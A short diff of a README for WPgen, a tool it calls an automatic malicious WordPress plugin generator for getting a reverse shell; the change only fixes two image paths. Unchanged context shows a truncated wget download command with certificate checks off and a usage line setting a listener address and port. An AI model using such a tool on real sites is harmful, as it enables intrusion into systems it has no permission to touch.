@@ -2,7 +2,7 @@
 
 #### **WPgen** is an automatic malicious plugin generator for **WordPress**, get a reverse shell in a simple and fast way.
 
-![](/img/screenshot.png)
+![](/WPgen/img/screenshot.png)
 
 ---
 
@@ -18,6 +18,6 @@ wget --no-check-certificate -q "https://raw.githubusercontent.com/VulNyx/Arsenal
 WPgen -l 192.168.1.X -p 443
 ```
 
-![](/img/usage.png)
+![](/WPgen/img/usage.png)
 
 ---
